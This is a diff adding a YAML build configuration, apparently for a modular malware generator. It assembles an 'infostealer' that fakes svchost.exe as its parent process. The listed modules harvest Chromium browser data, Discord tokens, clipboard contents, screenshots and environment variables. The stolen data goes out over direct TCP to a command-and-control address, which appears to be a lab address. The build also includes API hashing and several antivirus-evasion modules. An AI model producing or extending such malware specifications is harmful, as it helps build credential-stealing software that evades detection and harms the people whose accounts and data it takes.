@@ -1,0 +1,35 @@
+name: infostealer_ppid_svchost
+description: Infostealer with svchost PPID spoofing — appears as child of svchost.exe in process tree
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/installed_software
+  - collectors/env_vars
+  - collectors/clipboard
+  - collectors/browser_chromium
+  - collectors/discord_tokens
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/sequential
+
+api_resolve: api_resolve/api_hash_crc32
+process: process/ppid_spoof_svchost
+
+resources: true
+
+evasion:
+  - evasion/iat_pad
+  - evasion/entropy_pad
+  - evasion/behavioral_pacing
+  - evasion/section_merge
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
